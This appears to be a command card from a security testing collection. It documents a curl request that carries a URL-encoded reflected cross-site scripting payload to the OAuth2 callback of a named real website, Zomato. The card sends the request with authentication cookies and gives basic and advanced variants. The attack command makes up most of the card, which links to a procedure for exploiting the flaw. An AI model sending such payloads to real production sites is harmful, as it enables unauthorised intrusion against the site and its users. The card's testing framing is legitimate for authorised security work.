---
id: cmd-uuid-placeholder
data: >-
  curl
  "https://www.zomato.com/googleOAuth2Callback?)%7D(alert)(location);%7B%3C!--&state=%5C"
  -b "cookies.txt" -v
tags:
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.580Z'
verified: false
validated: true
submitted: true
---
# access-malicious-oauth-url

## Command

```bash
curl "https://www.zomato.com/googleOAuth2Callback?)%7D(alert)(location);%7B%3C!--&state=%5C" -b "cookies.txt" -v
```

## Description

This command uses curl to access a crafted URL exploiting a reflected XSS in Zomato's OAuth2 callback, simulating the attack with authentication cookies to test payload reflection without browser execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b, --cookie` | Specify cookie file for authentication (e.g., cookies.txt) | Yes |
| `-v, --verbose` | Enable verbose output to inspect response | No |
| URL | The full malicious URL with encoded payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.zomato.com/googleOAuth2Callback?)%7D(alert)(location);%7B%3C!--&state=%5C" -b "cookies.txt" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "https://www.zomato.com/googleOAuth2Callback?)%7D(alert)(location);%7B%3C!--&state=%5C" -b "cookies.txt" -o response.html -v
```

## Expected Output

Verbose curl output showing HTTP response, including the reflected payload in the HTML. Look for the injected JavaScript in the response body; no alert in curl, but confirms reflection for browser testing.

## Related

- [[Related Procedure|procedures/Exploit-Reflected-XSS-in-OAuth2-State-Parameter]]
